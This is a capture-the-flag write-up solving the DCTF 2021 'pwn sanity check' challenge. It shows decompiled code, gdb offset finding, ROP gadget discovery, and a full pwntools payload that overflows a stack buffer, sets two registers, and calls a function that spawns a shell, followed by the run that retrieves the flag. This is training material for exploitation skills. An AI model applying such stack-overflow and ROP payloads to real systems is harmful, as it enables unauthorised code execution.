
Function *vuln* calls *shell*, which was not going to spawn a shell, but *win* function would. *vuln* took *0x100* bytes of input, but *local_48* can only take *60*, overflow it then call *win* shall bring a shell.

```c
void vuln(void)
{
  char local_48 [60];
  int local_c;
  
  puts("tell me a joke");
  fgets(local_48,0x100,stdin);
  if (local_c == -0x21523f22) {
    puts("very good, here is a shell for you. ");
    shell();
  }
  else {
    puts("will this work?");
  }
  return;
}

void shell(void)
{
  puts("spawning /bin/sh process");
  puts("wush!");
  printf("$> ");
  puts("If this is not good enough, you will just have to try harder :)");
  return;
}

void win(int param_1,int param_2)
{
  puts("you made it to win land, no free handouts this time, try harder");
  if (param_1 == -0x21524111) {
    puts("one down, one to go!");
    if (param_2 == 0x1337c0de) {
      puts("2/2 bro good job");
      system("/bin/sh");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  }
  return;
}
```

### Find The Padding

Run in *gdb*, input a precreated 100 bytes pattern to overflow the array, 

```bash
gef➤  pattern create 100                                                            
[+] Generating a pattern of 100 bytes                                                                                                                                   
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa                                                                    
[+] Saved as '$_gef0'                                                                                                                                                   
gef➤  r                                                                             
Starting program: /home/zex/lab_ex/hacking-lab/dctf-2021/pwn-sanity-check/pwn_sanity_check                                                                              
tell me a joke                                                                      
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa                                                                    
will this work?                                                                     
                                                                                    
Program received signal SIGSEGV, Segmentation fault.   
...
```


Checked out *rip* for the address, searched the patten, the offset was likely to be *72*, so *72* bytes padding might be needed.

```bash
gef➤  info frame 
Stack level 0, frame at 0x7fffffffda98:
 rip = 0x40078b in vuln; saved rip = 0x616161616161616a
 called by frame at 0x7fffffffdaa8
 Arglist at 0x6161616161616169, args: 
 Locals at 0x6161616161616169, Previous frame's sp is 0x7fffffffdaa0
 Saved registers:
  rip at 0x7fffffffda98
gef➤  pattern search 0x616161616161616a
[+] Searching '0x616161616161616a'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 65 (big-endian search) 
```


### Pass The Parameters


Took a look into the asm code from *objdump*, *win* used *edi* for the first parameter and *esi* for the second one, they were supposed to be *0xdeadbeef* and *0x1337c0de*, respectively.

```asm
0000000000400697 <win>:
  400697:       55                      push   %rbp
  400698:       48 89 e5                mov    %rsp,%rbp
  40069b:       48 83 ec 10             sub    $0x10,%rsp
  40069f:       89 7d fc                mov    %edi,-0x4(%rbp)
  4006a2:       89 75 f8                mov    %esi,-0x8(%rbp)
  4006a5:       48 8d 3d 8c 01 00 00    lea    0x18c(%rip),%rdi        # 400838 <_IO_stdin_used+0x8>
  4006ac:       e8 9f fe ff ff          callq  400550 <puts@plt>
  4006b1:       81 7d fc ef be ad de    cmpl   $0xdeadbeef,-0x4(%rbp)
  4006b8:       75 37                   jne    4006f1 <win+0x5a>
  4006ba:       48 8d 3d b7 01 00 00    lea    0x1b7(%rip),%rdi        # 400878 <_IO_stdin_used+0x48>
  4006c1:       e8 8a fe ff ff          callq  400550 <puts@plt>
  4006c6:       81 7d f8 de c0 37 13    cmpl   $0x1337c0de,-0x8(%rbp)
  4006cd:       75 22                   jne    4006f1 <win+0x5a>
  4006cf:       48 8d 3d b7 01 00 00    lea    0x1b7(%rip),%rdi        # 40088d <_IO_stdin_used+0x5d>
  4006d6:       e8 75 fe ff ff          callq  400550 <puts@plt>
  4006db:       48 8d 3d bc 01 00 00    lea    0x1bc(%rip),%rdi        # 40089e <_IO_stdin_used+0x6e>
  4006e2:       e8 79 fe ff ff          callq  400560 <system@plt>
  4006e7:       bf 00 00 00 00          mov    $0x0,%edi
  4006ec:       e8 af fe ff ff          callq  4005a0 <exit@plt>
  4006f1:       90                      nop
  4006f2:       c9                      leaveq 
  4006f3:       c3                      retq  
```

To pass the parameters, gadgets can be handy. Gadget *'pop rsi; ret;'* wasn't found, but *'pop rsi; pop r15; ret;'* also work.

```bash
$ ROPgadget --binary pwn_sanity_check |grep "pop rsi"
0x0000000000400811 : pop rsi ; pop r15 ; ret
```

Used *pwn.ROP* in python.

```python
pop_rdi = pwn.p64(rop.find_gadget(['pop rdi', 'ret']).address)
pop_rsi = pwn.p64(rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address)
```

### Cat Flag.txt

Combined them all, the payload was created as below.

```python
payload = b"A"*72
payload += pop_rdi
payload += pwn.p64(0xdeadbeef)
payload += pop_rsi
payload += pwn.p64(0x1337c0de)
payload += pwn.p64(0x1337c0de)
payload += pwn.p64(elf.sym['win'])
```

Cat the flag once pwned. Complete exploit is [here](https://github.com/onealmond/hacking-lab/blob/master/dctf-2021/pwn-sanity-check/exploit.py).

```python
print(payload, len(payload))
pr.sendafter("joke\n", payload)
pr.sendline()
pr.sendline("cat flag.txt")
print(pr.readall(2))
```

```bash
$ python3 exploit.py 
[+] Opening connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io on port 7480: Done
[*] '/home/zex/lab_ex/hacking-lab/dctf-2021/pwn-sanity-check/pwn_sanity_check'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for 'pwn_sanity_check'
b'\x13\x08@\x00\x00\x00\x00\x00'
b'\x11\x08@\x00\x00\x00\x00\x00'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x13\x08@\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\x11\x08@\x00\x00\x00\x00\x00\xde\xc07\x13\x00\x00\x00\x00\xde\xc07\x13\x00\x00\x00\x00\x97\x06@\x00\x00\x00\x00\x00' 120
[+] Receiving all data: Done (137B)
[*] Closed connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io port 7480
b'will this work?\nyou made it to win land, no free handouts this time, try harder\none down, one to go!\n2/2 bro good job\ndctf{Ju5t_m0v3_0n}\n'
```

